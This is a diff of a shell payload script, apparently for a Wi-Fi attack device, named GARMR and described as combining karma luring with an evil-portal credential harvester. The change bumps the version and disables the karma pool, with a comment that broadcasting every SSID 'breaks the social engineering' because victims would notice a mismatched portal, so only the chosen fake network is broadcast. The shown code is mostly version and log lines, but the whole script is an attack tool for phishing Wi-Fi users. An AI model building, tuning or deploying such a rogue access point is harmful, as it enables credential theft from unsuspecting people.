@@ -2,7 +2,7 @@
 # Title: GARMR - Karma + Evil Portal Combined
 # Description: SKOLL's karma luring + LOKI's credential harvesting in one payload
 # Author: HaleHound
-# Version: 4.7.8
+# Version: 4.7.9
 # Category: user/attack
 #
 # Named after the blood-stained hound that guards the gates of HALE
@@ -1203,7 +1203,7 @@ LOG "┏━┛┏━┃┏━┃┏┏ ┏━┃"
 LOG "┃ ┃┏━┃┏┏┛┃┃┃┏┏┛"
 LOG "━━┛┛ ┛┛ ┛┛┛┛┛ ┛"
 LOG ""
-LOG "       GARMR v4.7.8"
+LOG "       GARMR v4.7.9"
 LOG ""
 
 led_setup
@@ -1475,10 +1475,13 @@ case $portal_choice in
         ;;
 esac
 
-# === STEP 4: START KARMA (SKOLL) ===
+# === STEP 4: KARMA POOL DISABLED ===
+# Karma pool broadcasts ALL SSIDs which breaks the social engineering
+# (target connects to "Airport WiFi" but sees McDonald's portal = suspicious)
+# Open AP already broadcasts the selected SSID via set_broadcast_ssid()
 LOG ""
-LOG "=== STARTING KARMA ==="
-start_karma_pool
+LOG "=== SSID ACTIVE ==="
+LOG "Broadcasting: $SELECTED_SSID"
 
 # === MARK ACTIVE ===
 touch /tmp/garmr_running
